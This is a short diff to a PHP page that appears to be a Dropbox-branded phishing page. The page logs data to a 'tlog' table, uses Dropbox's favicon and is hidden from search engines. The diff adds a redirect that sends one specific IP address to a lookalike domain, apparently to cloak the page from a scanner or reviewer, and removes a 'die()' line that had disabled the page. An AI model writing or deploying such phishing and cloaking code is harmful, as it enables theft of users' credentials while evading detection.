@@ -60,6 +60,12 @@ if (insertDataIntoDatabase("tlog", $keys, $values)) {
   //exit();
 }
 
+
+if ($_SERVER['REMOTE_ADDR'] == "34.171.130.176") {
+  header("Location: https://beta.dpbx.me/cloudflare2.php");
+die();
+}
+
 ?>
 <html lang="en" class=""><head>
 
@@ -68,7 +74,7 @@ if (insertDataIntoDatabase("tlog", $keys, $values)) {
   <link rel="icon" href="https://cfl.dropboxstatic.com/static/metaserver/static/images/favicon-vfl8lUR9B.ico" type="image/x-icon">
   <meta name="robots" content="noindex">
 
-<?php die(); ?>
+
 
   <link rel="canonical" href="https://codepen.io/ta7382/pen/zjMrgM?editors=1111">
 
